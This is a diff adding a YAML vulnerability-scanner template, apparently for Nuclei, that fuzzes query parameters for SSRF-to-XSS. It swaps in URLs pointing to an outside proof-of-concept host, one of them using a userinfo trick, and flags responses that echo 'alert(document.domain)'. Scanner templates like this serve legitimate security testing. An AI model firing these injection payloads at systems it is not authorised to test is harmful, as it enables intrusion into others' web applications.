@@ -1,0 +1,39 @@
+id: brutelogic-xss
+
+info:
+  name: Brutelogic XSS
+  author: reewardius
+  severity: medium
+  reference: https://medium.com/@D0rkerDevil/how-i-convert-ssrf-to-xss-in-a-ssrf-vulnerable-jira-e9f37ad5b158
+  tags: fuzzing-xss,fuzzing-req
+  
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    payloads:
+      logic:
+        - "http://brutelogic.com.br/poc.svg"
+        - "http://brutelogic.com.br/2"
+        - "12:3@brutelogic.com.br/2"
+        
+    fuzzing:
+      - part: query
+        mode: multiple
+        type: replace
+        fuzz:
+          - "{{logic}}"
+          
+    redirects: true
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "alert(document.domain)"
+          
+      - type: word
+        part: header
+        words:
+          - text/html
